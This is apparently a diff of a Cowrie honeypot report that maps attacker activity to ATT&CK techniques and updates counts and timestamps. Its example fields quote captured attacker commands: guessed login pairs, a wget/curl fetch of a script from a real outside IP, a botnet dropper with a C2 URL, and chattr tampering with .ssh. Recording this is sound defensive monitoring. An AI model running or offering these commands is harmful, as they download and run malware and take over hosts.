@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-21 05:02:11",
+  "generated": "2026-09-21 06:03:11",
   "totals": {
-    "commands": 203,
-    "login_failed": 268,
-    "login_success": 33,
-    "sessions": 449
+    "commands": 221,
+    "login_failed": 298,
+    "login_success": 41,
+    "sessions": 502
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 268,
+      "count": 298,
       "examples": [
         "root / 654321",
         "scout / scout",
@@ -21,14 +21,14 @@
         "user / 11q2w3e4r5t"
       ],
       "first": "2026-09-21T00:00:00.681036Z",
-      "last": "2026-09-21T04:57:55.862157Z",
-      "unique_ips": 29
+      "last": "2026-09-21T06:03:08.075573Z",
+      "unique_ips": 33
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 66,
+      "count": 69,
       "examples": [
         "cat /proc/cpuinfo | grep name | wc -l",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
@@ -37,14 +37,14 @@
         "cat /proc/cpuinfo | grep model | grep name | wc -l"
       ],
       "first": "2026-09-21T00:43:34.288062Z",
-      "last": "2026-09-21T04:23:52.147258Z",
-      "unique_ips": 10
+      "last": "2026-09-21T05:05:18.465555Z",
+      "unique_ips": 11
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 33,
+      "count": 41,
       "examples": [
         "root / root",
         "root / vizxv",
@@ -53,14 +53,14 @@
         "zhangc / zhangc123"
       ],
       "first": "2026-09-21T00:19:23.395124Z",
-      "last": "2026-09-21T04:49:31.987728Z",
-      "unique_ips": 21
+      "last": "2026-09-21T06:00:20.075513Z",
+      "unique_ips": 24
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 32,
+      "count": 41,
       "examples": [
         "cd /tmp;rm -rf wget.sh; wget http://58.211.144.243:800/wget.sh; busybox wget http://58.211.144.243:800/wget.sh; curl -O ",
         "http://58.211.144.243:800/wget.sh",
@@ -69,14 +69,14 @@
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
       ],
       "first": "2026-09-21T00:19:23.495089Z",
-      "last": "2026-09-21T04:23:14.039387Z",
-      "unique_ips": 11
+      "last": "2026-09-21T05:05:18.465555Z",
+      "unique_ips": 12
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 20,
+      "count": 23,
       "examples": [
         "#!/bin/sh\ngroup=$1\nserver=\"58.211.144.243:800\"\nbins=\"arc armv6l i586 mips sh4 armv4l armv7l i686 mipsel sparc armv5l i48",
         "cd ~; chattr -ia .ssh; lockr -ia .ssh",
@@ -85,8 +85,8 @@
         "#!/bin/bash\nulimit -n 1024 2>/dev/null || true\ncp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /va"
       ],
       "first": "2026-09-21T00:19:31.058459Z",
-      "last": "2026-09-21T04:23:13.583416Z",
-      "unique_ips": 11
+      "last": "2026-09-21T05:05:18.465555Z",
+      "unique_ips": 12
     },
     {
       "id": "T1033",
@@ -166,24 +166,36 @@
       "first": "2026-09-21T00:19:31.058459Z",
       "last": "2026-09-21T04:21:57.786454Z",
       "unique_ips": 5
+    },
+    {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "Execution",
+      "count": 3,
+      "examples": [
+        "#!/bin/sh\nC2_URL=\"http://2.27.248.149/bins\"\nARCH=$(uname -m)\nBOT_FILE=\"\"\n\ncase \"$ARCH\" in\n    x86_64|amd64)\n        BOT_"
+      ],
+      "first": "2026-09-21T05:05:09.218156Z",
+      "last": "2026-09-21T05:05:18.465555Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "system",
-      10
+      13
     ],
     [
       "shell",
-      10
+      13
     ],
     [
       "sh",
-      10
+      13
     ],
     [
       "/bin/busybox UNSTABLE",
-      10
+      13
     ],
     [
       "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found",
